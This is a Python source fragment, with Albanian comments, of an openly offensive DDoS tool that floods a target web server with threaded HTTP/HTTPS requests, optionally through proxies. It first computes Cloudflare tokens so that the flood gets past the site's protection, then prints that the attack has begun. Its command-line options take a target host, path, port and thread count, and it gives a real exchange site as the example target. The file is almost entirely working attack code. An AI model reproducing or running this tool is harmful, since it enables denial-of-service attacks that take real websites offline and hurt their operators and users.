import cfscrape, socket, urllib.request, ssl
import _thread, threading, random, argparse
from urllib.request import Request,urlopen
from time import sleep


# Funksioni main()
def main():
    if args.proxy_file != None:
        proxyget()
    global go
    global x
    x = 0
    go = threading.Event()
    if cloudflare():
        print("*** Serveri", args.host, "ka gjeneruar mekanizmin mbrojtës të Cloudflare")
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token,(i,)) # Kalkulo CF token
        sleep(5)
        print("*** Sulmi DDOS ka filluar")
        for x in range(args.threads):
            set_request_cf()
            RequestProxyHTTP(x + 1).start()
        go.set()
    else:
        print("*** Serveri", args.host, "nuk ka gjeneruar mekanizem mbrojtës të Cloudflare")
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())          # Dergo kerkesen, nuk ka nevoje per kalkulime
        sleep(5)
        print("*** Sulmi DDOS ka filluar")
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
        go.set()



# Funksioni për  komandat e mundeshme për përdorim te aplikacionit
def usage():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', nargs="?", help="Web serveri, p.sh: coinmarketcap.com", required=True)
    parser.add_argument('-d', '--dir', default="", help="Web path, p.sh: admin/index.php (Default: /)")
    parser.add_argument('-s', '--ssl', dest="ssl", action="store_false", help="HTTP/HTTPS")
    parser.add_argument('-p', '--port', default=80,help="Port #, 80 ose 443 (Default 80)", type=int)
    parser.add_argument('-t', '--threads', default=100, help="Numri i fijeve/threads (Default 100)", type=int)
    parser.add_argument('-x', '--proxy_file', help="Tekst fajlli për ruajtjen e proxy-ve (Opcionale)")
    return parser.parse_args()
    

